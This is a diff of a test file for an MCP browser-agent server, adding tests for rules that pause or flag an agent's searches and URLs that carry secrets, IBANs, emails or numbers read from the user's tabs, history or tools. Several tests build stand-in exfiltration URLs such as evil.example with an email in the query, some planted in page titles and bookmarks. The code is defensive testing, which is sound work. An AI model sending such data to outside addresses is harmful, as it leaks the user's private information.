@@ -9,11 +9,13 @@ import { SearchSessions, STOP_TEXT, CLOSED_TEXT, type Band, type Gesture } from 
 import { Client } from "@modelcontextprotocol/sdk/client/index.js";
 import { StreamableHTTPClientTransport } from "@modelcontextprotocol/sdk/client/streamableHttp.js";
 import { AccessPolicy } from "../../src/access/policy.js";
-import { PRIVATE_TEXT, type TabInfo } from "../../src/mcp/bridge.js";
+import { PRIVATE_TEXT, type HistoryResult, type KeptPage, type TabInfo } from "../../src/mcp/bridge.js";
 import type { Watcher } from "../../src/search/watcher.js";
 import { FakeBridge } from "../../src/mcp/fake-bridge.js";
 import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
-import { NO_WORKFLOW_OPEN, HIDDEN_ACTION_RUNS_NOTICE, HIDDEN_RUNS_NOTICE, startMcpServer, PENDING_SITE_NAVIGATION, navigationOutsideSite, SITE_DATA_PREFIX, TWEAK_ERRORS_PREFIX, SITE_UNKNOWN, SITE_DENIED, SITE_MEMORY_MAX_SHOWN, type SitesTools, DENIAL_TEXT, RESERVED_ERROR, RESERVED_ACTION_ERROR, ACTION_DATA_PREFIX, WIDGET_DATA_PREFIX, generateToken, type ActionsTools, type AppsTools, type WidgetsTools, type OpenWorkflow, LINKS_HEADER, RECAP_UPDATED_PRIVATE } from "../../src/mcp/server.js";
+import { Outflow } from "../../src/outflow/outflow.js";
+import { mask } from "../../src/outflow/detect.js";
+import { NO_WORKFLOW_OPEN, HIDDEN_ACTION_RUNS_NOTICE, HIDDEN_RUNS_NOTICE, startMcpServer, PENDING_SITE_NAVIGATION, navigationOutsideSite, SITE_DATA_PREFIX, TWEAK_ERRORS_PREFIX, SITE_UNKNOWN, SITE_DENIED, SITE_MEMORY_MAX_SHOWN, type SitesTools, DENIAL_TEXT, RESERVED_ERROR, RESERVED_ACTION_ERROR, ACTION_DATA_PREFIX, WIDGET_DATA_PREFIX, generateToken, type ActionsTools, type AppsTools, type WidgetsTools, type OpenWorkflow, LINKS_HEADER, RECAP_UPDATED_PRIVATE, OUTFLOW_PAUSE, OUTFLOW_DANGER } from "../../src/mcp/server.js";
 import type { Execution } from "../../src/workflows/executions.js";
 import { ACTION_UNKNOWN, ACTION_WITHOUT_WORKFLOW, RESULT_TOO_BIG, requiredInput, type LaunchResult } from "../../src/actions/run.js";
 import { INTERNAL_ACTION_ERROR } from "../../src/actions/file.js";
@@ -1539,14 +1541,14 @@ const c = { text: "C", url: "https://exemple.fr/c" };
 
 async function withSearch(
   attempt: (o: { call: (name: string, args: Record<string, unknown>, token?: string, onprogress?: (n: number) => void) => Promise<{ text: string; isError: boolean }>; token: string; fake: FakeBridge; search: SearchSessions; s: Awaited<ReturnType<typeof startMcpServer>>; bands: [string, Band | null][]; policy: AccessPolicy }) => Promise<void>,
-  opts: { privateWindows?: string[]; allow?: boolean; emptySpanMs?: number; address?: boolean | "wait" | "later"; failing?: string[]; hanging?: string[]; readPageMs?: number; heartbeatMs?: number; watcher?: Watcher; withUserData?: boolean; recaps?: boolean; notes?: BrowsingNotes; idleMs?: number; onActivity?: (a: { tab: string; label: string }) => void } = {},
+  opts: { privateWindows?: string[]; allow?: boolean; emptySpanMs?: number; address?: boolean | "wait" | "later"; failing?: string[]; hanging?: string[]; readPageMs?: number; heartbeatMs?: number; watcher?: Watcher; withUserData?: boolean; history?: { results: HistoryResult[]; texts?: KeptPage[] }; sites?: Record<string, string[]>; bookmarks?: { title: string; url: string }[]; recaps?: boolean; notes?: BrowsingNotes; idleMs?: number; onActivity?: (a: { tab: string; label: string }) => void; outflow?: Outflow; tabs?: TabInfo[]; widgets?: WidgetsTools } = {},
 ) {
   const principal = generateToken();
-  const fake = new FakeBridge([github], { active: "github", allow: opts.allow ?? false, ...(opts.withUserData ? { history: { results: [] }, bookmarks: [], widgetData: true } : {}), search: { privateWindows: opts.privateWindows ?? [], failing: opts.failing ?? [], hanging: opts.hanging ?? [] }, ...(opts.address !== undefined ? { address: opts.address } : {}) });
+  const fake = new FakeBridge(opts.tabs ?? [github], { active: "github", allow: opts.allow ?? false, ...(opts.withUserData ? { history: opts.history ?? { results: [] }, bookmarks: opts.bookmarks ?? [], widgetData: true } : {}), search: { privateWindows: opts.privateWindows ?? [], failing: opts.failing ?? [], hanging: opts.hanging ?? [] }, ...(opts.address !== undefined ? { address: opts.address } : {}), ...(opts.sites ? { sites: opts.sites } : {}) });
   const bands: [string, Band | null][] = [];
   const search = new SearchSessions({ show: (id, band) => bands.push([id, band]), ...(opts.idleMs ? { idleMs: opts.idleMs } : {}) });
   const policy = new AccessPolicy();
-  const s = await startMcpServer({ bridge: fake, policy, token: principal, search, ...(opts.watcher ? { watcher: opts.watcher } : {}), settleMs: 0, emptySpanMs: opts.emptySpanMs ?? 0, ...(opts.heartbeatMs ? { heartbeatMs: opts.heartbeatMs } : {}), ...(opts.readPageMs !== undefined ? { readPageMs: opts.readPageMs } : {}), ...(opts.onActivity ? { onActivity: opts.onActivity } : {}), ...(opts.notes ? { notes: opts.notes } : {}), ...(opts.recaps ? { recaps: createRecaps({ folder: await tempFolder() }) } : {}) });
+  const s = await startMcpServer({ bridge: fake, policy, token: principal, search, ...(opts.watcher ? { watcher: () => opts.watcher } : {}), settleMs: 0, emptySpanMs: opts.emptySpanMs ?? 0, ...(opts.heartbeatMs ? { heartbeatMs: opts.heartbeatMs } : {}), ...(opts.readPageMs !== undefined ? { readPageMs: opts.readPageMs } : {}), ...(opts.onActivity ? { onActivity: opts.onActivity } : {}), ...(opts.notes ? { notes: opts.notes } : {}), ...(opts.outflow ? { outflow: opts.outflow } : {}), ...(opts.widgets ? { widgets: opts.widgets } : {}), ...(opts.recaps ? { recaps: createRecaps({ folder: await tempFolder() }) } : {}) });
   const clients: Client[] = [];
   const call = async (name: string, args: Record<string, unknown>, clientToken = principal, onprogress?: (n: number) => void) => {
     // search_web needs a goal: a test that does not care gets one.
@@ -2785,6 +2787,361 @@ test("list_tabs shows the search tab as not shared while a hand is open, even wi
     search.continue("search-1");
     await hand;
   });
+});
+
+// --- what goes out of the agent (outflow rules) ---
+
+const SECRET = "sk_live_4eC39HqLyjWDarjtT1zdp7dc";
+const IBAN = "FR1420041010050500013M02606";
+const mailTab: TabInfo = { ...gmail, title: `Gmail — camille.roussel@example.com ${IBAN}` };
+const githubTab: TabInfo = { ...github, title: "CI — ERR_PNPM_OUTDATED_LOCKFILE 4827361" };
+const opens = (fake: FakeBridge) => fake.calls.filter((x) => x.method === "search.open").map((x) => x.args[1]);
+
+test("search_web with a secret pauses before the engine, first query and a later one; Continuer sends it unchanged", async () => {
+  await withSearch(async ({ call, fake, search, bands }) => {
+    const first = call("search_web", { query: `clé ${SECRET}`, goal: "but" });
+    const band = OUTFLOW_PAUSE({ kind: "api-key", masked: mask(SECRET) });
+    await vi.waitFor(() => expect(bands.at(-1)![1]).toMatchObject({ state: "yours", text: band }));
+    expect(opens(fake)).toEqual([{ query: "" }]);
+    search.continue("search-1");
+    expect((await first).text).toContain("Onglet : search-1");
+    expect(opens(fake)).toEqual([{ query: "" }, { query: `clé ${SECRET}` }]);
+    const later = call("search_web", { query: `encore ${SECRET}` });
+    await vi.waitFor(() => expect(bands.at(-1)![1]).toMatchObject({ state: "yours", text: band }));
+    expect(opens(fake)).toHaveLength(2);
+    search.stop("search-1");
+    expect((await later).text).toBe(STOP_TEXT);
+    expect(opens(fake)).toHaveLength(2);
+  }, { outflow: new Outflow() });
+});
+
+test("search_web refuses a query over 2 000 characters before any check", async () => {
+  await withSearch(async ({ call, fake }) => {
+    expect((await call("search_web", { query: "a".repeat(2001) })).isError).toBe(true);
+    expect(opens(fake)).toEqual([]);
+  }, { outflow: new Outflow() });
+});
+
+test("search_web with data read in a granted tab pauses and names its source", async () => {
+  await withSearch(async ({ call, fake, search, bands, policy }) => {
+    policy.grant(mailTab);
+    await call("read_tab", { id: "gmail" });
+    const pending = call("search_web", { query: "camille.roussel@example.com" });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.state).toBe("yours"));
+    expect(bands.at(-1)![1]!.text).toContain("une adresse e-mail, lu dans mail.google.com");
+    expect(opens(fake)).toEqual([{ query: "" }]);
+    search.continue("search-1");
+    await pending;
+  }, { outflow: new Outflow(), tabs: [github, mailTab] });
+});
+
+test("a shared tab that is not sensitive is not a source; a shared sensitive one is", async () => {
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.userInteraction(githubTab);
+    await call("read_tab", { id: "github" });
+    expect((await call("search_web", { query: "lockfile 4827361" })).text).toContain("Onglet : search-1");
+    expect(opens(fake)).toEqual([{ query: "lockfile 4827361" }]);
+  }, { outflow: new Outflow(), tabs: [githubTab, mailTab] });
+  await withSearch(async ({ call, search, bands, policy }) => {
+    policy.userInteraction(mailTab);
+    await call("read_tab", { id: "gmail" });
+    const pending = call("search_web", { query: "camille.roussel@example.com" });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.text).toContain("lu dans mail.google.com"));
+    search.continue("search-1");
+    await pending;
+  }, { outflow: new Outflow(), tabs: [githubTab, mailTab] });
+});
+
+test("what list_tabs returned is a source, named « tes onglets »; without an outflow nothing pauses", async () => {
+  for (const outflow of [new Outflow(), undefined]) {
+    await withSearch(async ({ call, fake, search, bands, policy }) => {
+      policy.grant(githubTab);
+      await call("list_tabs", {});
+      const pending = call("search_web", { query: "lockfile 4827361" });
+      if (!outflow) {
+        await pending;
+        expect(opens(fake)).toEqual([{ query: "lockfile 4827361" }]);
+        return;
+      }
+      await vi.waitFor(() => expect(bands.at(-1)![1]?.text).toBe(OUTFLOW_PAUSE({ kind: "digits", masked: mask("4827361"), source: "tes onglets" })));
+      search.continue("search-1");
+      await pending;
+    }, { tabs: [githubTab], ...(outflow ? { outflow } : {}) });
+  }
+});
+
+test("a composed address carrying read data gets a danger line, with or without the watcher; the card still decides", async () => {
+  const danger = OUTFLOW_DANGER({ kind: "iban", masked: mask(IBAN), source: "mail.google.com" });
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grant(mailTab);
+    await call("read_tab", { id: "gmail" });
+    expect((await call("open_tab", { url: `https://ailleurs.fr/?i=${IBAN}`, reason: "r" })).text).toMatch(/^agent-/);
+    expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toMatchObject({ danger });
+    expect((await call("open_tab", { url: "https://ailleurs.fr/propre", reason: "r" })).text).toMatch(/^agent-/);
+    expect(fake.calls.filter((x) => x.method === "askAddress")[1]!.args[0]).not.toHaveProperty("danger");
+  }, { outflow: new Outflow(), tabs: [github, mailTab], address: true });
+  const { watcher } = fakeWatcher(() => false);
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grant(mailTab);
+    await call("read_tab", { id: "gmail" });
+    await call("search_web", { query: "x", goal: "but" });
+    expect((await call("navigate", { id: "search-1", url: `https://ailleurs.fr/?i=${IBAN}`, reason: "r" })).text).toContain("Onglet search-1 →");
+    await call("read_pages", { urls: [`https://autre.fr/?i=${IBAN}`] });
+    const cards = fake.calls.filter((x) => x.method === "askAddress").map((x) => x.args[0]);
+    expect(cards).toHaveLength(2);
+    for (const card of cards) expect(card).toMatchObject({ danger });
+    expect(cards[0]).not.toHaveProperty("opinion");
+  }, { outflow: new Outflow(), tabs: [github, mailTab], address: true, watcher });
+});
+
+test("a sensitive tab asks again once per search, and not outside one", async () => {
+  await withSearch(async ({ call, fake, search, policy }) => {
+    const asks = () => fake.calls.filter((x) => x.method === "askPermission").length;
+    policy.grant(gmail);
+    await call("read_tab", { id: "gmail" });
+    await call("capture_screen", { id: "gmail" });
+    expect(asks()).toBe(0);
+    await call("search_web", { query: "x" });
+    await call("read_tab", { id: "gmail" });
+    expect(asks()).toBe(1);
+    await call("read_tab", { id: "gmail" });
+    await call("capture_screen", { id: "gmail" });
+    // A tab that is not sensitive never asks again.
+    policy.grant(github);
+    await call("read_tab", { id: "github" });
+    expect(asks()).toBe(1);
+    search.stop("search-1");
+    await call("search_web", { query: "y" }); // takes the stop
+    await call("search_web", { query: "y" });
+    await call("capture_screen", { id: "gmail" });
+    expect(asks()).toBe(2);
+  }, { allow: true, tabs: [github, gmail] });
+  await withSearch(async ({ call, policy }) => {
+    policy.grant(gmail);
+    await call("search_web", { query: "x" });
+    expect((await call("read_tab", { id: "gmail" })).text).toBe(DENIAL_TEXT);
+  }, { allow: false, tabs: [github, gmail] });
+});
+
+test("history asks again once per search", async () => {
+  await withSearch(async ({ call, fake, policy }) => {
+    const cards = () => fake.calls.filter((x) => x.method === "askWidgetData").length;
+    policy.grantHistory();
+    await call("search_history", { query: "h" });
+    expect(cards()).toBe(0);
+    await call("search_web", { query: "x" });
+    await call("search_history", { query: "h" });
+    await call("search_bookmarks", { query: "b" });
+    await call("read_history", { url: "https://a.fr/" });
+    expect(cards()).toBe(1);
+    expect(fake.calls.find((x) => x.method === "askWidgetData")!.args[0]).toMatchObject({ kind: "history" });
+  }, { withUserData: true });
+});
+
+test("a shared tab gone to another site is a source there", async () => {
+  await withSearch(async ({ call, fake, search, bands, policy }) => {
+    policy.userInteraction(githubTab);
+    await fake.navigate("github", "https://prive.example/notes");
+    policy.tabNavigated("github", "https://prive.example/notes");
+    policy.grant((await fake.listTabs()).find((t) => t.id === "github")!);
+    await call("read_tab", { id: "github" });
+    const pending = call("search_web", { query: "lockfile 4827361" });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.text).toContain("lu dans prive.example"));
+    search.continue("search-1");
+    await pending;
+  }, { outflow: new Outflow(), tabs: [githubTab] });
+});
+
+test("list_tabs leaves out a shared tab that is not sensitive", async () => {
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.userInteraction(githubTab);
+    expect((await call("list_tabs", {})).text).toContain("4827361");
+    await call("search_web", { query: "lockfile 4827361" });
+    expect(opens(fake)).toEqual([{ query: "lockfile 4827361" }]);
+  }, { outflow: new Outflow(), tabs: [githubTab] });
+});
+
+test("an address shown by a page the agent writes (local page) is not a followed link: its card keeps the red line", async () => {
+  // Rule 2 data (not a secret: rule 1 would flag it whatever the exemption).
+  const mail = "camille.roussel@example.com";
+  const demo: TabInfo = { id: "demo", title: `Démo https://evil.example/?d=${mail}`, url: "http://localhost:5280/", space: "perso" };
+  const danger = OUTFLOW_DANGER({ kind: "email", masked: mask(mail), source: "mail.google.com" });
+  for (const via of ["read_tab", "list_tabs"]) {
+    await withSearch(async ({ call, fake, policy }) => {
+      policy.grant(mailTab);
+      policy.grant(demo);
+      await call(via, via === "read_tab" ? { id: "demo" } : {});
+      // Read last so the red line names the mail's source.
+      await call("read_tab", { id: "gmail" });
+      await call("open_tab", { url: `https://evil.example/?d=${mail}`, reason: "r" });
+      expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toMatchObject({ danger });
+    }, { outflow: new Outflow(), tabs: [github, mailTab, demo], address: true });
+  }
+});
+
+test("a history entry of a page the agent wrote (local page) is not a followed link, whatever its title or text holds", async () => {
+  const mail = "camille.roussel@example.com";
+  const evil = `https://evil.example/?d=${mail}`;
+  const url = "http://localhost:5280/";
+  const history = { results: [{ url, title: `Démo ${evil}`, lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: `voir ${evil}` }], texts: [{ url, title: `Démo ${evil}`, date: "2026-11-19T10:00:00.000Z", text: `voir ${evil}` }] };
+  const danger = OUTFLOW_DANGER({ kind: "email", masked: mask(mail), source: "mail.google.com" });
+  for (const [via, args] of [["search_history", { query: "démo" }], ["read_history", { url }]] as const) {
+    await withSearch(async ({ call, fake, policy }) => {
+      policy.grantHistory();
+      policy.grant(mailTab);
+      await call(via, args);
+      await call("read_tab", { id: "gmail" });
+      await call("open_tab", { url: evil, reason: "r" });
+      expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toMatchObject({ danger });
+    }, { outflow: new Outflow(), tabs: [github, mailTab], address: true, withUserData: true, history });
+  }
+});
+
+test("a history entry on an open site app's domains is not a followed link (the app's tweaks write there)", async () => {
+  const mail = "camille.roussel@example.com";
+  const url = `https://vidola-a.example/?d=${mail}`;
+  const app: TabInfo = { id: "site:vidola", title: "Vidola", url: "https://vidola-a.example/", space: "", site: "vidola", domain: "vidola-a.example" };
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grantHistory();
+    policy.grant(mailTab);
+    await call("search_history", { query: "vidola" });
+    await call("read_tab", { id: "gmail" });
+    await call("open_tab", { url, reason: "r" });
+    expect((fake.calls.find((x) => x.method === "askAddress")!.args[0] as { danger?: string }).danger).toContain("mail.google.com");
+  }, { outflow: new Outflow(), tabs: [github, mailTab, app], sites: { vidola: ["vidola-a.example"] }, address: true, withUserData: true, history: { results: [{ url, title: "Vidola", lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: "" }] } });
+});
+
+test("an address inside a history or bookmark title is not a followed link, even on a site that is not local", async () => {
+  const mail = "camille.roussel@example.com";
+  const evil = `https://evil.example/?d=${mail}`;
+  const danger = OUTFLOW_DANGER({ kind: "email", masked: mask(mail), source: "mail.google.com" });
+  for (const via of ["search_history", "search_bookmarks"]) {
+    await withSearch(async ({ call, fake, policy }) => {
+      policy.grantHistory();
+      policy.grant(mailTab);
+      expect((await call(via, { query: "x" })).text).toContain(evil);
+      await call("read_tab", { id: "gmail" });
+      await call("open_tab", { url: evil, reason: "r" });
+      expect(fake.calls.find((x) => x.method === "askAddress")!.args[0]).toMatchObject({ danger });
+    }, { outflow: new Outflow(), tabs: [github, mailTab], address: true, withUserData: true, bookmarks: [{ title: `Lien ${evil}`, url: "https://blog.example/" }], history: { results: [{ url: "https://blog.example/", title: `Lien ${evil}`, lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: "" }] } });
+  }
+});
+
+test("a history search still answers when the tab list fails", async () => {
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grantHistory();
+    fake.listTabs = () => Promise.reject(new Error("gone"));
+    const r = await call("search_history", { query: "x" });
+    expect(r.isError).toBe(false);
+    expect(r.text).toContain("https://blog.example/");
+  }, { outflow: new Outflow(), withUserData: true, history: { results: [{ url: "https://blog.example/", title: "Blog", lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: "" }] } });
+});
+
+test("a history entry's own address is a followed link: no red line", async () => {
+  const mail = "camille.roussel@example.com";
+  const url = `https://exemple.fr/suivi?m=${mail}`;
+  await withSearch(async ({ call, fake, policy }) => {
+    policy.grantHistory();
+    policy.grant(mailTab);
+    await call("search_history", { query: "suivi" });
+    await call("read_tab", { id: "gmail" });
+    await call("open_tab", { url, reason: "r" });
+    expect((fake.calls.find((x) => x.method === "askAddress")!.args[0] as { danger?: string }).danger).toBeUndefined();
+  }, { outflow: new Outflow(), tabs: [github, mailTab], address: true, withUserData: true, history: { results: [{ url, title: "Suivi", lastVisit: "2026-11-19T10:00:00.000Z", visits: 1, excerpt: "" }] } });
+});
+
+test("a sensitive page on the search tab (a sign-in the user did) is a source", async () => {
+  await withSearch(async ({ call, fake, search, bands }) => {
+    await call("search_web", { query: "x" });
+    await fake.navigate("search-1", "https://mail.google.com/mail/u/0/#inbox/73519264");
+    await call("read_tab", { id: "search-1" });
+    const pending = call("search_web", { query: "colis 73519264" });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.text).toContain("lu dans mail.google.com"));
+    search.continue("search-1");
+    await pending;
+  }, { outflow: new Outflow() });
+});
+
+test("any tool's text is a source (widget_runs); a status the agent caused (navigate) is not", async () => {
+  const widgets = {
+    read: async () => ({ name: "Commandes", account: false, data: null }),
+    runs: async () => [{ id: "r1", trigger: "manual", start: "2026-10-28T10:00:00.000Z", end: "2026-10-28T10:00:07.000Z", status: "succeeded", blocks: [{ id: "commande 48213977", status: "succeeded", items: 1 }] }],
+  } as unknown as WidgetsTools;
+  await withSearch(async ({ call, fake, search, bands, policy }) => {
+    policy.grant(github);
+    expect((await call("navigate", { id: "github", url: "https://exemple.fr/n/91827364", reason: "r" })).text).toContain("91827364");
+    await call("search_web", { query: "91827364" });
+    expect(opens(fake)).toEqual([{ query: "91827364" }]);
+    await call("widget_runs", { id: "commandes" });
+    const pending = call("search_web", { query: "commande 48213977" });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.state).toBe("yours"));
+    expect(bands.at(-1)![1]!.text).toContain("un numéro");
+    search.continue("search-1");
+    await pending;
+  }, { outflow: new Outflow(), widgets, address: true });
+});
+
+test("a recap the agent wrote from the search is not a source", async () => {
+  await withSearch(async ({ call, fake }) => {
+    const plan = { blocks: [{ component: "cards", props: { items: "items", title: "name", link: "url" } }] };
+    const shown = (await call("show_recap", { title: "Vélos", results: { items: [{ name: "Réf 58203917", url: "https://exemple.fr/a" }] }, plan })).text;
+    const id = /Récap ([0-9a-f-]{36}) ouvert/.exec(shown)![1];
+    expect((await call("read_recap", { id })).text).toContain("58203917");
+    await call("search_web", { query: "réf 58203917" });
+    expect(opens(fake)).toEqual([{ query: "réf 58203917" }]);
+  }, { outflow: new Outflow(), recaps: true });
+});
+
+test("what the user browsed during a hand-over is a source, named in French", async () => {
+  await withSearch(async ({ call, search, bands }) => {
+    await call("search_web", { query: "x" });
+    const hand = call("hand_over", { id: "search-1", reason: "r", kind: "verification" });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.state).toBe("yours"));
+    search.tabNavigated("search-1", "https://exemple.fr/suivi/73519264");
+    search.continue("search-1");
+    expect((await hand).text).toContain("73519264");
+    const pending = call("search_web", { query: "colis 73519264" });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.text).toContain("lu dans ta navigation pendant le passage de main"));
+    search.continue("search-1");
+    await pending;
+  }, { outflow: new Outflow() });
+});
+
+test("a query both held and strange: the watcher's band shows it masked", async () => {
+  const { watcher } = fakeWatcher(() => true);
+  await withSearch(async ({ call, search, bands }) => {
+    const pending = call("search_web", { query: `clé ${SECRET}`, goal: "but" });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.text).toBe(OUTFLOW_PAUSE({ kind: "api-key", masked: mask(SECRET) })));
+    search.continue("search-1");
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.text).toContain("sans rapport avec"));
+    expect(bands.at(-1)![1]!.text).toContain(mask(SECRET));
+    expect(bands.at(-1)![1]!.text).not.toContain(SECRET);
+    search.continue("search-1");
+    await pending;
+    const later = call("search_web", { query: `encore ${SECRET}` });
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.text).toContain("la recherche contient"));
+    search.continue("search-1");
+    await vi.waitFor(() => expect(bands.at(-1)![1]?.text).toContain("sans rapport avec"));
+    expect(bands.at(-1)![1]!.text).not.toContain(SECRET);
+    search.continue("search-1");
+    await later;
+  }, { outflow: new Outflow(), watcher });
+});
+
+test("the watcher judges against the user's last message, else the search goal", async () => {
+  const typed = fakeWatcher(() => false);
+  const outflow = new Outflow();
+  outflow.typed("main", "aspirateur robot pas cher\r");
+  await withSearch(async ({ call }) => {
+    await call("search_web", { query: "x", goal: "but de l'agent" });
+    await call("search_web", { query: "y" });
+    expect(typed.asked.map((x) => x.goal)).toEqual(["aspirateur robot pas cher", "aspirateur robot pas cher"]);
+  }, { watcher: typed.watcher, outflow });
+  const none = fakeWatcher(() => false);
+  await withSearch(async ({ call }) => {
+    await call("search_web", { query: "x", goal: "but de l'agent" });
+    expect(none.asked.map((x) => x.goal)).toEqual(["but de l'agent"]);
+  }, { watcher: none.watcher, outflow: new Outflow() });
 });
 
 describe("recaps", () => {
